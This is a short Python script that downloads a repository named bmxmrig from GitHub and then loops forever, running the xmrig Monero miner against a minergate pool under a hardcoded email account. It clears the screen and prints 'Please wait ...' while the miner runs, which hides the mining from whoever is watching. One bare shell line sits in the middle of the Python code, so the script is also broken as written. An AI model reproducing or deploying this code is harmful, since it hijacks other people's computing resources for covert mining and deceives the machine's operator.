import sys
import os
from time import sleep
os.system('sudo apt update -y')
sleep(2)
os.system('git clone https://github.com/quincyhays/bmxmrig')
sleep(2)
os.system('cd bmxmrig && chmod +x *')
sleep(2)
cd bmxmrig && chmod +x *
while(True):
	os.system('clear')
	os.system('cd bmxmrig && timeout 1800 ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
	print("Please wait ...")
	sleep(600)
